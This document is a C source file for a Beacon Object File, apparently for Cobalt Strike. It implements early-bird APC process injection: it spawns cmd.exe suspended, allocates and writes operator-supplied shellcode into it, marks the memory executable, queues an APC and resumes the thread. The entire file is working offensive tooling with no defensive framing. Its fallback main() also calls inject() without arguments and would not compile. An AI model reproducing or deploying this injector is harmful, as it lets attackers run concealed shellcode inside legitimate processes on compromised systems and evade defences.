#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include <tchar.h>
#include <stdio.h>

void inject(const CHAR* shellcode, SIZE_T shellcodeSize) {
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
        (unsigned char)shellcode[0], (unsigned char)shellcode[1],
        (unsigned char)shellcode[2], (unsigned char)shellcode[3]);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";
    BOOL createProcessRes = KERNEL32$CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
    if (createProcessRes == 0) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to create process: %lu\n", err);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "process created: %p\n", pi.hProcess);

    LPVOID allocatedMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocatedMemory == 0) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to allocate memory: %lu\n", err);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "memory allocated: %p\n", allocatedMemory);

    SIZE_T bytesWritten = 0;
    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(pi.hProcess, allocatedMemory, shellcode, shellcodeSize, &bytesWritten);
    if (writeProcessMemoryRes == 0) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to write process memory: %lu\n", err);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "process memory written: %lu\n", bytesWritten);

    DWORD oldProtect = 0;
    BOOL virtualProtectExRes = KERNEL32$VirtualProtectEx(pi.hProcess, allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (virtualProtectExRes == 0) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to change memory protection: %lu\n", err);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "memory protection changed to RX: %lu\n", oldProtect);

    DWORD QueueUserAPCRes = KERNEL32$QueueUserAPC((PAPCFUNC)allocatedMemory, pi.hThread, 0);
    if (QueueUserAPCRes == 0) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_OUTPUT, "failed to queue user APC: %lu\n", err);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "user APC queued: %lu\n", QueueUserAPCRes);

    KERNEL32$ResumeThread(pi.hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "process resumed: %lu\n", pi.dwProcessId);

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);    
    return;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{


    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    int shellcodeSizeInt = 0;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;


    if (!bofstart())
    {
        return;
    }

    inject(shellcode, shellcodeSize);

    printoutput(TRUE);
    bofstop();
};
#else
int main()
{
    inject();
    return 1;
}
#endif
